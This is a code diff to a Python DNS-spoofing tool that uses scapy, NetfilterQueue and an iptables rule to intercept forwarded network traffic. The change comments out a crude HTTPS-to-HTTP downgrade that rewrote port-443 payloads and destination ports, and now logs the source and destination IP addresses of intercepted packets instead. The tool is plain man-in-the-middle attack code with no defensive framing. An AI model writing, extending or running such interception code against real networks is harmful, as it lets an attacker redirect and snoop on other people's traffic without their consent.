@@ -2,6 +2,7 @@ import os
 import logging as log
 import re
 from scapy.all import IP, DNSRR, DNS, UDP, DNSQR, TCP, Raw
+from scapy.layers.http import *
 from netfilterqueue import NetfilterQueue
 
 
@@ -15,6 +16,7 @@ class DnsSpoof:
 		log.info("Spoofing....")
 		os.system(
 			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+		
 		self.queue.bind(self.queueNum, self.callBack)
 		try:
 			self.queue.run()
@@ -51,24 +53,24 @@ class DnsSpoof:
             # Check if it's an HTTPS request
 			if scapyPacket[TCP].dport == 443:
 				try:
-					load = scapyPacket[Raw].load.decode()
-					# Check if it contains an HTTPS URL
-					if "GET " in load or "POST " in load:
-						# Replace HTTPS with HTTp
-						load = load.replace("https://", "http://")
-						scapyPacket[Raw].load = load.encode()
+					print(scapyPacket[IP].src + ", " + scapyPacket[IP].dst)
+					# load = scapyPacket[Raw].load.decode()
+					# # Check if it contains an HTTPS URL
+					# if "GET " in load or "POST " in load:
+					# 	# Replace HTTPS with HTTP
+					# 	load = load.replace("https://", "http://")
+					# 	scapyPacket[Raw].load = load.encode()
 
-                        # Change the destination port to 80 (HTTP)
-						scapyPacket[TCP].dport = 80
+                    # Change the destination port to 80 (HTTP)
+					# scapyPacket[TCP].dport = 80
 
-                        # Remove checksums to force recalculation
-						del scapyPacket[IP].chksum
-						del scapyPacket[TCP].chksum
-						packet.set_payload(bytes(scapyPacket))
-				
+                    # Remove checksums to force recalculation
+					# del scapyPacket[IP].chksum
+					# del scapyPacket[TCP].chksum
+					# packet.set_payload(bytes(scapyPacket))
 				except Exception as e:
 					print(f"Error modifying packet: {e}")
-		return packet.accept()
+		return packet.accept()	
 
 
 if __name__ == '__main__':
